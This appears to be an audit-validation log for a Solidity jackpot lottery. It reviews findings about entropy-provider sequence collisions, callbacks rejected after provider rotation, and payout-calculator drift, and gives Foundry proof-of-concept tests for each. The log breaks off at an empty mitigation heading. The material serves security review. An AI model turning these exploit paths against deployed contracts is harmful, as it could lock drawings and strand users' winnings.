### Finding Status Justification: ScaledEntropyProvider stores pending requests as mapping(uint64 => PendingRequest), _storePendingRequest overwrites pending[sequence], and entropyCallback ignores the provider argument. The Pyth interface exposes provider-scoped getRequestV2(provider, sequenceNumber), supporting the collision premise. A provider rotation requires ScaledEntropyProvider owner action, but after rotation requestAndCallbackScaledRandomness is public and can overwrite a colliding sequence. There is no provider namespacing or overwrite guard. The code is in scope and the issue is presently reachable if rotation occurs with pending requests.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
Pending entropy requests are keyed only by `uint64 sequence`, while Pyth sequence numbers are provider-scoped and `entropyCallback` ignores the provider argument. If the owner rotates `entropyProvider` while an old Jackpot request is pending, a permissionless caller can create a request on the new provider with the same sequence and overwrite the old Jackpot pending callback. Vulnerable snippets: `mapping(uint64 => PendingRequest) private pending;`, `pending[sequence].callback = msg.sender;`, and `function entropyCallback(uint64 sequence, address /*provider*/, bytes32 randomNumber)`. Fulfillment of the old sequence then deletes or delivers the overwritten request, while Jackpot never receives its callback and remains locked.

## Impact
The active Jackpot drawing can be stuck with `jackpotLock == true`, blocking ticket purchases, LP deposits, normal withdrawals, and progression until trusted governance enters emergency recovery.

## Proof of Concept
1. Jackpot calls runJackpot(), which stores pending sequence N for provider A in ScaledEntropyProvider. 2. Governance rotates ScaledEntropyProvider to provider B before provider A fulfills. 3. Attacker calls requestAndCallbackScaledRandomness() directly; provider B also returns sequence N, overwriting `pending[N]`. 4. Provider A's fulfillment for the Jackpot request arrives. 5. ScaledEntropyProvider looks up `pending[N]`, calls the attacker's callback or deletes the attacker's request, and Jackpot never receives scaledEntropyCallback(). 6. The drawing remains locked.

## Proof of Code
pragma solidity ^0.8.28;
import "forge-std/Test.sol";
import "../contracts/ScaledEntropyProvider.sol";
contract SeqEntropyMock { mapping(address=>uint64) public next; function requestV2(address provider,uint32) external payable returns (uint64) { next[provider] += 1; return next[provider]; } function getFeeV2(address,uint32) external pure returns (uint128) { return 0; } function fulfill(address consumer,uint64 seq,address provider) external { (bool ok,) = consumer.call(abi.encodeWithSignature("_entropyCallback(uint64,address,bytes32)", seq, provider, bytes32(uint256(123)))); require(ok); } }
contract ReqCb { ScaledEntropyProvider p; bool public called; constructor(ScaledEntropyProvider _p){p=_p;} function request() external { IScaledEntropyProvider.SetRequest[] memory r = new IScaledEntropyProvider.SetRequest[](1); r[0]=IScaledEntropyProvider.SetRequest({samples:1,minRange:1,maxRange:2,withReplacement:false}); p.requestAndCallbackScaledRandomness(1,r,this.cb.selector,""); } function cb(bytes32,uint256[][] memory,bytes memory) external { called=true; } }
contract SequenceCollisionPoC is Test { function testProviderScopedSequenceOverwrite() public { address A=address(0xA); address B=address(0xB); SeqEntropyMock e=new SeqEntropyMock(); ScaledEntropyProvider p=new ScaledEntropyProvider(address(e),A); ReqCb victim=new ReqCb(p); ReqCb attacker=new ReqCb(p); victim.request(); p.setEntropyProvider(B); attacker.request(); e.fulfill(address(p),1,A); assertFalse(victim.called()); assertTrue(attacker.called()); } }

## Suggested Mitigation
Key pending requests by both provider and sequence, store the provider in PendingRequest, and require the callback provider to match. Also prevent provider rotation while Jackpot-critical requests are pending or migrate pending requests explicitly.
```

### Current Validated Block
### M-93 / `PR2G588QO-Kwr3c5Fhe4w`
- Finding Title: Provider sequence collision can overwrite pending jackpot randomness and leave a drawing permanently locked
- Decision: Valid
- Confidence: Med
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `entropy-provider-sequence-collision`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: This is a concrete Jackpot-impact version of the provider sequence namespace bug. If the ScaledEntropyProvider owner rotates providers while a Jackpot request is pending, a public request on the new provider can collide with and overwrite the old sequence. The old fulfillment then no longer calls Jackpot, so the drawing can remain locked.
- Code Evidence: `contracts/ScaledEntropyProvider.sol::_storePendingRequest` has no check for an existing `pending[sequence]`, and `entropyCallback` ignores provider. `contracts/Jackpot.sol::runJackpot` depends on that callback to unlock and advance the drawing.

## M-94 / `hwZlFmHk1XCY6j0kVxNjK`
- Finding title: Payout calculator rotation reprices already settled unclaimed tickets
- Report lines: 6562-6596

### Original Report Block
```md
## [M-94]. Payout calculator rotation reprices already settled unclaimed tickets

## id: hwZlFmHk1XCY6j0kVxNjK

## Derived From Pattern/Invariant
BeaconOrFactoryAuthorityDrift / AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
Jackpot.setPayoutCalculator / claimWinnings

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: The global payoutCalculator is mutable through setPayoutCalculator, and claimWinnings reads historical payouts from that live global instead of a drawing snapshot. Settlement stores tier payouts in whichever calculator is active at settlement. No migration or freeze exists for old unclaimed tickets. The finding concerns in-scope production code and has no complete safeguard. It requires owner/governance rotation of the payout calculator.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
Settlement calculates and stores tier payouts in the payout calculator that is configured at settlement time, but claimWinnings later reads payouts from the globally mutable payoutCalculator. Vulnerable snippet: uint256 winningAmount = payoutCalculator.getTierPayout(drawingId, tierId);. If governance rotates the calculator for future drawings, old unclaimed tickets are priced against the new calculator, which may have no stored tierPayouts for the old drawing or different values. This burns the ticket before transferring the incorrectly computed payout.

## Impact
Winners from already settled drawings can be underpaid or paid zero after a normal payout-calculator upgrade, causing loss of matured winnings and making historical claims dependent on future configuration.

## Proof of Concept
1. Drawing d settles using payout calculator A, and A stores a nonzero tier payout for a winning ticket. 2. The winner does not claim immediately. 3. Owner rotates payoutCalculator to calculator B for future drawings. 4. B has no tierPayouts[d][tierId], or has a different value. 5. The winner claims; claimWinnings burns the NFT and reads B.getTierPayout(d, tierId), paying zero or an incorrect amount.

## Proof of Code
function test_rotatingPayoutCalculatorBreaksOldClaim() public { uint256 id = buyWinningTicket(alice); settleDrawingWithTicketAsWinner(id); uint256 drawingId = jackpot.currentDrawingId() - 1; uint256 tierId = jackpot.getTicketTierIds(singleton(id))[0]; uint256 expected = calcA.getTierPayout(drawingId, tierId); assertGt(expected, 0); MockPayoutCalculator calcB = new MockPayoutCalculator(); vm.prank(owner); jackpot.setPayoutCalculator(calcB); uint256 balBefore = usdc.balanceOf(alice); vm.prank(alice); jackpot.claimWinnings(singleton(id)); assertEq(usdc.balanceOf(alice) - balBefore, 0); assertEq(calcB.getTierPayout(drawingId, tierId), 0); }

## Suggested Mitigation
Snapshot the payout calculator address per drawing, e.g. mapping(uint256 => IPayoutCalculator) drawingPayoutCalculator, set it in _setNewDrawingState, and use drawingPayoutCalculator[drawingId].getTierPayout(...) during claims.
```

### Current Validated Block
### M-94 / `hwZlFmHk1XCY6j0kVxNjK`
- Finding Title: Payout calculator rotation reprices already settled unclaimed tickets
- Decision: Valid
- Confidence: High
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `payout-calculator-drift`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: Historical claims read from the live `payoutCalculator`, not the calculator that settled the drawing. A legitimate future-intended migration can therefore make old winners read zero or altered tier payouts and lose matured winnings when their tickets are burned. This is a material accounting bug.
- Code Evidence: `contracts/Jackpot.sol::claimWinnings` calls `payoutCalculator.getTierPayout(drawingId, tierId)` after burn. `setPayoutCalculator` provides no migration or drawing-level snapshot.

## M-96 / `4N5SxmjaZ5ZFkldy20qul`
- Finding title: Rotating payoutCalculator makes old winning tickets read payouts from the wrong calculator
- Report lines: 6649-6714

### Original Report Block
```md
## [M-96]. Rotating payoutCalculator makes old winning tickets read payouts from the wrong calculator

## id: 4N5SxmjaZ5ZFkldy20qul

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
Jackpot.claimWinnings

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: Settlement calculates tier payouts in the active payout calculator, but claimWinnings later queries the live mutable payoutCalculator for historical drawing IDs. setPayoutCalculator has no per-drawing snapshot, migration, or restriction while claims are outstanding. This is in in-scope production code and no complete safeguard exists. The path is exploitable after owner/governance rotates the calculator, so the privileged-actor flag is true.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
Settlement stores tier payouts in the payout calculator that is current during `scaledEntropyCallback`, but `claimWinnings` later reads the globally mutable `payoutCalculator`. Vulnerable snippet: `uint256 winningAmount = payoutCalculator.getTierPayout(drawingId, tierId);`. If governance rotates `payoutCalculator` after a drawing settles but before all winners claim, old tickets are burned and priced against the new calculator, which may have no stored payouts for that drawing or different payout values. This is distinct from ordinary admin fee changes because even a legitimate calculator rotation for future drawings changes the claim source for already-settled drawings.

## Impact
Unclaimed winners from past drawings can be underpaid or receive zero after a legitimate payout calculator migration. The ticket is burned before payment, so the user cannot retry against the original calculator.

## Proof of Concept
1. Drawing D settles while payout calculator A is configured; A stores nonzero tier payout for a winning tier. 2. A winning ticket holder has not claimed yet. 3. Governance rotates to payout calculator B for future drawings. 4. The holder calls `claimWinnings`. 5. Jackpot burns the NFT and queries `B.getTierPayout(D, tierId)`, which returns zero or a different value, so the winner loses the settled payout.

## Proof of Code
// Foundry-style PoC sketch
function test_rotatingPayoutCalculatorZeroesOldClaims() public {
    FixedPayoutCalculator calcA = new FixedPayoutCalculator(100e6);
    FixedPayoutCalculator calcB = new FixedPayoutCalculator(0);
    Jackpot jackpot = deployInitializedJackpotWithCalculator(address(calcA));

    uint256 ticketId = buyKnownWinningTicket(jackpot, alice);
    settleDrawingWithWinningTicket(jackpot, ticketId);

    uint256[] memory ids = new uint256[](1);
    ids[0] = ticketId;

    vm.prank(jackpot.owner());
    jackpot.setPayoutCalculator(IPayoutCalculator(address(calcB)));

    uint256 beforeBal = usdc.balanceOf(alice);
    vm.prank(alice);
    jackpot.claimWinnings(ids);
    uint256 afterBal = usdc.balanceOf(alice);

    assertEq(afterBal - beforeBal, 0);
    vm.expectRevert();
    jackpotNFT.ownerOf(ticketId);
}

contract FixedPayoutCalculator is IPayoutCalculator {
    uint256 public payout;
    constructor(uint256 p) { payout = p; }
    function setDrawingTierInfo(uint256) external {}
    function calculateAndStoreDrawingUserWinnings(uint256, uint256, uint8, uint8, uint256[] memory, uint256[] memory) external view returns (uint256) { return payout; }
    function getTierPayout(uint256, uint256) external view returns (uint256) { return payout; }
}

## Suggested Mitigation
Snapshot the payout calculator per drawing, for example `mapping(uint256 => IPayoutCalculator) drawingPayoutCalculator`, set it in `_setNewDrawingState` or settlement, and have `claimWinnings` query the calculator associated with `ticketInfo.drawingId`. Alternatively migrate old payout data before allowing rotation.
```

### Current Validated Block
### M-96 / `4N5SxmjaZ5ZFkldy20qul`
- Finding Title: Rotating payoutCalculator makes old winning tickets read payouts from the wrong calculator
- Decision: Valid
- Confidence: High
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `payout-calculator-drift`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: The wrong-calculator read is exactly present. Old tickets use their original `drawingId`, but payout lookup goes through the current global calculator rather than a per-drawing calculator. A post-settlement rotation can underpay or zero unclaimed winners and burn their tickets in the process.
- Code Evidence: `contracts/Jackpot.sol::claimWinnings` retrieves `ticketInfo.drawingId` but then calls the mutable global `payoutCalculator.getTierPayout`. `contracts/Jackpot.sol::setPayoutCalculator` has no claim-outstanding guard.

## M-97 / `c1taCy-rUpLHmD9KeiD5V`
- Finding title: Entropy address rotation during a pending request permanently rejects the valid callback
- Report lines: 6715-6749

### Original Report Block
```md
## [M-97]. Entropy address rotation during a pending request permanently rejects the valid callback

## id: c1taCy-rUpLHmD9KeiD5V

## Derived From Pattern/Invariant
BeaconFactoryAuthorityDrift

## Exploit Type
BeaconFactoryAuthorityDrift

## Location
Jackpot.setEntropy

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: runJackpot requests entropy from the current entropy contract, but Jackpot does not store the request source. scaledEntropyCallback is guarded by onlyEntropy, which compares msg.sender to the live entropy address. setEntropy can update that address while jackpotLock is true. Therefore a valid callback from the old entropy contract reverts, with no alternate binding to the request-time provider. This production path is in scope and has no complete safeguard. It requires owner rotation of entropy during an in-flight request.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
`runJackpot()` requests randomness from the current `entropy` contract but does not snapshot that address for the pending drawing. The callback gate uses the live value: `modifier onlyEntropy() { if (msg.sender != address(entropy)) revert JackpotErrors.UnauthorizedEntropyCaller(); _; }`. If governance updates `entropy` before the old request is fulfilled, the old entropy provider's valid callback is rejected and the drawing remains locked.

## Impact
A routine entropy-provider migration intended to affect future drawings can brick the active drawing, preventing settlement and forcing emergency-mode recovery. Winners and LPs lose normal settlement/claim flow until governance intervenes.

## Proof of Concept
1. Anyone calls `runJackpot()`, setting `jackpotLock = true` and requesting entropy from provider A. 2. Owner calls `setEntropy(providerB)` before A fulfills. 3. Provider A calls `scaledEntropyCallback()`. 4. `onlyEntropy` compares `msg.sender` to provider B and reverts. 5. The drawing remains locked with no successful callback path from the original request.

## Proof of Code
pragma solidity ^0.8.28; import "forge-std/Test.sol"; contract EntropyRotationLockPoC is Test { function testOldEntropyCallbackRejectedAfterRotation() public { JackpotTestHarness h = deployInitializedJackpot(); vm.warp(h.drawingTime() + 1); h.jackpot().runJackpot{value: h.entropyFee()}(); IScaledEntropyProvider oldEntropy = h.entropy(); MockScaledEntropyProvider newEntropy = new MockScaledEntropyProvider(); vm.prank(h.owner()); h.jackpot().setEntropy(IScaledEntropyProvider(address(newEntropy))); vm.expectRevert(); h.fulfillFrom(address(oldEntropy)); assertTrue(h.jackpot().getDrawingState(h.jackpot().currentDrawingId()).jackpotLock); } }

## Suggested Mitigation
Snapshot `entropyForDrawing[currentDrawingId]` when `runJackpot()` requests randomness and validate callbacks against that stored address. Also disallow entropy updates while the current drawing is locked or has a pending request.
```

### Current Validated Block
### M-97 / `c1taCy-rUpLHmD9KeiD5V`
- Finding Title: Entropy address rotation during a pending request permanently rejects the valid callback
- Decision: Valid
- Confidence: High
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `entropy-authority-drift`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: The pending request source is not stored, and callback authorization uses the live entropy address. Rotating entropy after `runJackpot` but before fulfillment rejects the valid old callback and leaves the locked drawing without a normal settlement path. This is within the benchmark's explicit admin-mid-flow concern.
- Code Evidence: `contracts/Jackpot.sol::runJackpot` calls the current `entropy`; `setEntropy` mutates the same global; `onlyEntropy` on `scaledEntropyCallback` compares against the updated global.

## M-98 / `bqDE4tP4lSLVtXr7da9Tk`
- Finding title: Changing Jackpot.entropy after runJackpot makes the in-flight entropy callback unauthorized and bricks settlement
- Report lines: 6750-6784

### Original Report Block
```md
## [M-98]. Changing Jackpot.entropy after runJackpot makes the in-flight entropy callback unauthorized and bricks settlement

## id: bqDE4tP4lSLVtXr7da9Tk

## Derived From Pattern/Invariant
GlobalParamMidFlowManipulation / live entropy address read during settlement callback

## Exploit Type
GlobalParamMidFlowManipulation

## Location
Jackpot.setEntropy

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: The root cause exists exactly as described. runJackpot sends the request through entropy but does not snapshot the address or request id. setEntropy is owner-only and can change the global entropy. scaledEntropyCallback only accepts msg.sender == address(entropy), using the live global value. An old provider callback after rotation is unauthorized and the locked drawing remains unsettled. The code is in scope and no guard forbids entropy updates while locked. Exploitation requires privileged governance action.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
`runJackpot()` sends the randomness request through the current `entropy`, but `scaledEntropyCallback()` authorizes the caller against the live mutable `entropy` address: `if (msg.sender != address(entropy)) revert JackpotErrors.UnauthorizedEntropyCaller();`. If governance rotates the entropy contract after a drawing is locked but before the old provider calls back, the legitimate old callback reverts. The request-time entropy address is not snapshotted per drawing/request.

## Impact
A normal entropy rotation during an active drawing can leave `drawingState[currentDrawingId].jackpotLock` true with no successful settlement path from the in-flight request. Ticket claims for that drawing and normal LP progression are blocked until privileged recovery, and manual unlock risks changing the ticket set after randomness was requested.

## Proof of Concept
1. A drawing becomes due and `runJackpot()` locks it and requests entropy from provider E1. 2. Governance calls `setEntropy(E2)` intending to use E2 for future drawings. 3. E1 later calls `scaledEntropyCallback()`. 4. `onlyEntropy` compares `msg.sender` with E2 and reverts. 5. The drawing remains locked and unsettled.

## Proof of Code
pragma solidity ^0.8.28; import 'forge-std/Test.sol'; import '../contracts/Jackpot.sol'; import '../contracts/interfaces/IScaledEntropyProvider.sol'; import '../contracts/lib/JackpotErrors.sol'; contract JackpotHarness is Jackpot { constructor() Jackpot(1 days, 10, 10, 1e17, 2e17, 0, 0, 0, 0, 1e6, 1, 100000) {} function forceLock(uint256 id) external { currentDrawingId = id; drawingState[id].jackpotLock = true; } } contract EntropyRotationMidFlowTest is Test { function test_oldEntropyCallbackRejectedAfterRotation() public { JackpotHarness j = new JackpotHarness(); address oldEntropy = address(0xE1); address newEntropy = address(0xE2); j.setEntropy(IScaledEntropyProvider(oldEntropy)); j.forceLock(1); j.setEntropy(IScaledEntropyProvider(newEntropy)); uint256[][] memory nums = new uint256[][](2); vm.prank(oldEntropy); vm.expectRevert(JackpotErrors.UnauthorizedEntropyCaller.selector); j.scaledEntropyCallback(bytes32(0), nums, bytes('')); } }

## Suggested Mitigation
Snapshot the entropy provider/request source when requesting randomness and validate callbacks against the stored source for that drawing. Alternatively, disallow `setEntropy()` while the current drawing is locked or has an outstanding entropy request.
```

### Current Validated Block
### M-98 / `bqDE4tP4lSLVtXr7da9Tk`
- Finding Title: Changing Jackpot.entropy after runJackpot makes the in-flight entropy callback unauthorized and bricks settlement
- Decision: Valid
- Confidence: High
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `entropy-authority-drift`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: This is the same live-authority drift with clear code support: the request is made to `E1`, but after `setEntropy(E2)` only `E2` can call `scaledEntropyCallback`. Since `E2` has no pending request, the active drawing can stay locked until governance recovery. It is a material liveness failure under normal upgrade/migration behavior.
- Code Evidence: `contracts/Jackpot.sol::setEntropy` lacks a pending/locked guard. `scaledEntropyCallback` uses `onlyEntropy`, and `runJackpot` stores no request-time entropy address or request ID.

## M-100 / `pxtxFK-1LCZ2MRtDy6Fgn`
- Finding title: Provider sequence collisions can replay entropy into the wrong request after entropy provider rotation
- Report lines: 6876-6914

### Original Report Block
```md
## [M-100]. Provider sequence collisions can replay entropy into the wrong request after entropy provider rotation

## id: pxtxFK-1LCZ2MRtDy6Fgn

## Derived From Pattern/Invariant
StorageCollisionOrSelectorClash: mapping key from external source not scoped to provider/source; provider change creates overlapping sequence numbers.

## Exploit Type
ReplayAttack

## Location
ScaledEntropyProvider.entropyCallback

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: ScaledEntropyProvider stores pending request metadata by sequence only and entropyCallback ignores the provider argument. The Pyth V2 API keys requests by provider and sequence, so rotating providers can create overlapping sequence numbers. No composite key, provider check, or overwrite prevention exists. The relevant code is in scope. The scenario is currently possible when the owner rotates the entropy provider with pending requests, so it requires privileged action but is not speculative.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
`ScaledEntropyProvider` stores pending requests as `mapping(uint64 => PendingRequest) private pending;` and later handles callbacks with `entropyCallback(uint64 sequence, address /*provider*/, bytes32 randomNumber)`. The callback ignores the provider address, even though Pyth sequence numbers are provider-scoped and `setEntropyProvider()` can rotate the provider for future requests. A new provider can reuse the same sequence number as an old pending request, overwriting or misrouting `pending[sequence]`; an old provider callback can then deliver randomness into the new request's callback, or a new provider callback can fulfill stale request metadata.

## Impact
After a valid provider rotation with pending requests, jackpot drawings can be settled with entropy belonging to another provider/request, breaking randomness binding and potentially finalizing the wrong drawing or reverting the intended callback path.

## Proof of Concept
1. A jackpot randomness request is created through provider A with sequence s and remains pending. 2. Governance rotates the provider to B. 3. A later request through B also receives sequence s because sequence IDs are provider-local. 4. `pending[s]` is overwritten or ambiguously shared. 5. A callback for A/s or B/s is accepted without checking provider and uses the wrong pending request metadata/randomness.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;
import "forge-std/Test.sol";
contract ProviderKeyHarness { struct Pending{address callback; bytes32 tag;} mapping(uint64=>Pending) public pending; address public entropyProvider; function setEntropyProvider(address p) external { entropyProvider=p; } function request(uint64 sequence,bytes32 tag) external { pending[sequence]=Pending(msg.sender,tag); } function entropyCallback(uint64 sequence,address provider,bytes32) external view returns(address cb,bytes32 tag,address ignoredProvider){ Pending memory p=pending[sequence]; return (p.callback,p.tag,provider); } }
contract ProviderCollisionPoC is Test { function test_sequenceCollisionOverwritesAcrossProviders() external { ProviderKeyHarness h=new ProviderKeyHarness(); address providerA=address(0xA); address providerB=address(0xB); h.setEntropyProvider(providerA); h.request(7,bytes32("old")); h.setEntropyProvider(providerB); h.request(7,bytes32("new")); (address cb,bytes32 tag,address ignored)=h.entropyCallback(7,providerA,bytes32(uint256(1))); assertEq(cb,address(this)); assertEq(tag,bytes32("new")); assertEq(ignored,providerA); } }

## Suggested Mitigation
Scope pending requests by provider and sequence, for example `mapping(address => mapping(uint64 => PendingRequest))`, store the expected provider in `PendingRequest`, and require the callback provider to match before deleting or delivering the request. Jackpot should also bind the request id/provider to the locked drawing and reject mismatched callbacks.
```

### Current Validated Block
### M-100 / `pxtxFK-1LCZ2MRtDy6Fgn`
- Finding Title: Provider sequence collisions can replay entropy into the wrong request after entropy provider rotation
- Decision: Valid
- Confidence: Med
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `entropy-provider-sequence-collision`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: The provider-scoped sequence collision can cause entropy for one provider/request domain to be delivered using another request's pending metadata. This can misroute or lose callbacks after a normal provider rotation, including Jackpot drawing callbacks. The absence of provider namespacing or overwrite checks is the independent root cause.
- Code Evidence: `contracts/ScaledEntropyProvider.sol` stores pending requests in `mapping(uint64 => PendingRequest)`, ignores the `provider` callback argument, and allows `setEntropyProvider` while pending requests exist.

## M-101 / `OyeL2vMtI2i2rZz06wHLH`
- Finding title: Updating the payout calculator breaks already-settled ticket claims by reading payouts from the new calculator
- Report lines: 6915-6970

### Original Report Block
```md
## [M-101]. Updating the payout calculator breaks already-settled ticket claims by reading payouts from the new calculator

## id: OyeL2vMtI2i2rZz06wHLH

## Derived From Pattern/Invariant
BeaconOrFactoryAuthorityDrift

## Exploit Type
BeaconFactoryAuthorityDrift

## Location
Jackpot.setPayoutCalculator

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: claimWinnings reads payoutCalculator.getTierPayout(drawingId, tierId) from a mutable global. setPayoutCalculator can replace that global and does not snapshot per drawing or migrate old tierPayouts. A prior settled drawing's tickets can therefore read zero or different payouts from a new calculator. The code path is in in-scope Jackpot and no complete safeguard exists. It is currently reachable only through owner/governance calculator rotation.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
`claimWinnings()` reads historical tier payouts through the current global `payoutCalculator`: `uint256 winningAmount = payoutCalculator.getTierPayout(drawingId, tierId);`. `setPayoutCalculator()` can replace that contract at any time and does not preserve a per-drawing calculator address. If governance upgrades the calculator after a drawing settles but before all winners claim, those old winners query the new calculator, which has no stored payouts for the old drawing and may return zero or incompatible values. This contradicts the documented expectation that payout changes affect future drawings only.

## Impact
Unclaimed winners from prior drawings can be underpaid or have tickets burned for zero payout after a normal calculator migration. This locks or destroys matured winnings without requiring malicious governance behavior.

## Proof of Concept
1. Drawing N settles using payout calculator A, which stores nonzero tier payouts. 2. Some winners have not claimed yet. 3. Governance calls `setPayoutCalculator(B)` for future drawings. 4. A prior winner calls `claimWinnings()` for drawing N. 5. Jackpot burns the ticket, then asks calculator B for drawing N tier payout. 6. Calculator B returns zero or unrelated data, so the winner receives less than the settled payout.

## Proof of Code
// Foundry-style regression core
function testPayoutCalculatorUpgradeBreaksPastClaims() public {
    JackpotHarness jackpot = _deployHarness();
    MockNFT nft = jackpot.mockNFT();
    MockPayout oldCalc = jackpot.mockPayout();
    MockPayout newCalc = new MockPayout();

    uint256 winningPacked = (1 << 1) | (1 << 2) | (1 << 3) | (1 << 4) | (1 << 5) | (1 << 11);
    jackpot.hSetCurrentDrawingId(2);
    jackpot.hSetDrawing(1, winningPacked, 10, 0, 0);
    nft.setTicket(777, address(this), 1, winningPacked, bytes32(uint256(1)));
    oldCalc.setPayout(1, 11, 100e6);

    jackpot.setPayoutCalculator(IPayoutCalculator(address(newCalc)));

    uint256[] memory ids = new uint256[](1);
    ids[0] = 777;
    jackpot.claimWinnings(ids);

    assertEq(jackpot.mockUSDC().balanceOf(address(this)), 0);
    assertEq(nft.burned(777), true);
}

## Suggested Mitigation
Snapshot `payoutCalculator` per drawing and use `drawingPayoutCalculator[drawingId]` in `claimWinnings()`. Alternatively, block calculator upgrades while any settled drawings have unclaimed tickets or migrate historical payout data before switching.
```

### Current Validated Block
### M-101 / `OyeL2vMtI2i2rZz06wHLH`
- Finding Title: Updating the payout calculator breaks already-settled ticket claims by reading payouts from the new calculator
- Decision: Valid
- Confidence: High
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `payout-calculator-drift`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: A settled drawing's tier payout data is not bound to the ticket or drawing in Jackpot. Updating the calculator before all winners claim can make old tickets query a new calculator with no stored data for that drawing, resulting in zero or wrong payouts. Because `claimWinnings` burns before transfer, the user cannot retry against the original calculator after a successful zero-payout claim.
- Code Evidence: `contracts/Jackpot.sol::claimWinnings` calls `jackpotNFT.burnTicket(ticketId)` and then reads `payoutCalculator.getTierPayout(drawingId, tierId)`. `setPayoutCalculator` only changes the global pointer.

## M-102 / `Qet8mUOMbbhvJ91BSgZAI`
- Finding title: Provider-scoped entropy sequence numbers collide in ScaledEntropyProvider and can strand Jackpot drawings
- Report lines: 6971-7040

### Original Report Block
```md
## [M-102]. Provider-scoped entropy sequence numbers collide in ScaledEntropyProvider and can strand Jackpot drawings

## id: Qet8mUOMbbhvJ91BSgZAI

## Derived From Pattern/Invariant
StorageCollisionOrSelectorClash

## Exploit Type
StorageLayout

## Location
ScaledEntropyProvider.requestAndCallbackScaledRandomness

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: ScaledEntropyProvider stores pending callbacks in mapping(uint64 => PendingRequest), while Pyth V2 request identity includes provider and sequence. entropyCallback receives provider but ignores it, and _storePendingRequest overwrites by sequence. After owner provider rotation, public requests through the new provider can collide with old pending sequences and replace Jackpot callback metadata. No complete safeguard exists. The code is in scope and the attack path is current, but provider rotation is privileged.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
ScaledEntropyProvider stores pending entropy callbacks by `mapping(uint64 => PendingRequest) pending`, but Pyth V2 request identifiers are scoped by provider. The callback receives `(sequence, provider, randomNumber)`, yet entropyCallback ignores `provider` and loads only `pending[sequence]`. After a legitimate provider rotation, any caller can submit requests through the new provider until its sequence number equals an old pending Jackpot request, overwriting `pending[sequence]` with an attacker-controlled callback. When the old provider fulfills, the old sequence is delivered to the attacker's callback and the Jackpot callback is never executed. Vulnerable snippets: `mapping(uint64 => PendingRequest) private pending;`, `PendingRequest memory req = pending[sequence];`, and `_storePendingRequest(sequence, ...)` without provider namespacing.

## Impact
A pending Jackpot drawing can remain locked without settlement because its entropy fulfillment is consumed by an overwritten pending entry. Ticket claims and normal drawing progression remain unavailable until privileged manual recovery, creating a functional DoS of the jackpot lifecycle.

## Proof of Concept
1. Jackpot calls runJackpot through ScaledEntropyProvider using provider A and receives sequence N; pending[N] points to Jackpot.scaledEntropyCallback. 2. The ScaledEntropyProvider owner legitimately rotates to provider B for future requests while A's request is still pending. 3. An unprivileged attacker calls requestAndCallbackScaledRandomness repeatedly on provider B until provider B returns the same sequence N. 4. _storePendingRequest overwrites pending[N] with the attacker's callback. 5. Provider A later fulfills sequence N. Because entropyCallback ignores the provider argument, it loads the attacker's pending[N], deletes it, and calls the attacker instead of Jackpot. 6. Jackpot's drawing remains locked because scaledEntropyCallback was never called.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";

contract SequenceKeyCollisionTest is Test {
    struct PendingRequest { address callback; bytes4 selector; }
    mapping(uint64 => PendingRequest) internal pending;
    address jackpot = address(0xA11CE);
    address attacker = address(0xB0B);
    bool jackpotSettled;
    bool attackerCalled;

    function _store(uint64 sequence, address callback, bytes4 selector) internal {
        pending[sequence] = PendingRequest(callback, selector);
    }

    function _entropyCallback(uint64 sequence, address /* provider */) internal {
        PendingRequest memory req = pending[sequence];
        delete pending[sequence];
        (bool ok,) = req.callback.call(abi.encodeWithSelector(req.selector));
        require(ok, "callback failed");
    }

    function jackpotCallback() external { jackpotSettled = true; }
    function attackerCallback() external { attackerCalled = true; }

    function testProviderScopedSequenceOverwriteConsumesOldJackpotFulfillment() public {
        uint64 sequence = 1;
        _store(sequence, address(this), this.jackpotCallback.selector); // provider A pending Jackpot request
        _store(sequence, address(this), this.attackerCallback.selector); // provider B same sequence overwrites
        _entropyCallback(sequence, address(0xA)); // old provider A fulfills
        assertEq(attackerCalled, true);
        assertEq(jackpotSettled, false, "Jackpot callback was stranded");
    }
}

## Suggested Mitigation
